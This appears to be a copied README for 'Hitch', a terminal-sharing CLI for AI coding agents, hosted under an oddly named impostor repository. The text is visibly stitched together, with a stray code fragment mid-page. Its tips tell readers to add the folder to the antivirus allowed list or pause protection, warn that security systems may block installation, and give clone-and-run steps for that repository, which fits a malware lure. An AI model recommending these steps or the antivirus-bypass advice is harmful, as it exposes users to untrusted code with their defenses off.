<br>

<p align="center">
  <a name="readme-top"></a>
  <a href="https://github.com/Stalkerthroughadore/hitch-936">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="assets/logo-dark.svg">
      <source media="(prefers-color-scheme: light)" srcset="assets/logo-light.svg">
      <img alt="Hitch" src="assets/logo-light.svg" height="68">
    </picture>
  </a>
</p>

<h3 align="center">Share your terminal with coding agents</h3>

<p align="center">
  Let agents inspect and control the terminals you already have running.
</p>

<p align="center">
  <a href="https://github.com/Stalkerthroughadore/hitch-936"><strong>GitHub</strong></a> ·
  <a href="https://www.npmjs.com/package/hitch-cli"><strong>NPM</strong></a> ·
  <a href="https://x.com/maxktz"><strong>Author</strong></a>
</p>

<p align="center">
  <a href="https://www.npmjs.com/package/hitch-cli"><img src="https://img.shields.io/npm/v/hitch-cli?style=flat-square&color=333" alt="npm version"></a>
  <a href="https://www.npmjs.com/package/hitch-cli"><img src="https://img.shields.io/npm/l/hitch-cli?style=flat-square&color=333" alt="License"></a>
  <a href="https://www.npmjs.com/package/hitch-cli"><img src="https://img.shields.io/npm/dt/hitch-cli?style=flat-square&color=333" alt="npm downloads"></a>
</p>

---

## What is Hitch?

Hitch is a lightweight CLI for sharing real terminal with AI coding agents. run `hitch` and agents get your terminals context, can run keys or commands, and inspect output.

Helps with agents running duplicate dev servers, tunnels, and having to copy-paste logs to your agent.

It is not a terminal multiplexer UI like `tmux`. Your terminal still feels like a normal shell; Hitch just proxies input/output, records useful context, and exposes agent-friendly commands.


# or
hitch off
```


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/Stalkerthroughadore/hitch-936.git
cd hitch-936
npm install
npm start
```


> This is all a human will need! Rest of the commands built for agents.

## SKILL.md

It will help you install it on startup, but to reinstall or update run this:

```sh
hitch setup # recommended, uses 'npx skills'
# or
npx skills add https://github.com/Stalkerthroughadore/hitch-936 skill hitch
```

> If you're curious how this works for the agent, run `hitch --skill` to see the content :D


<!-- Last updated: 2026-06-06 15:24:35 -->
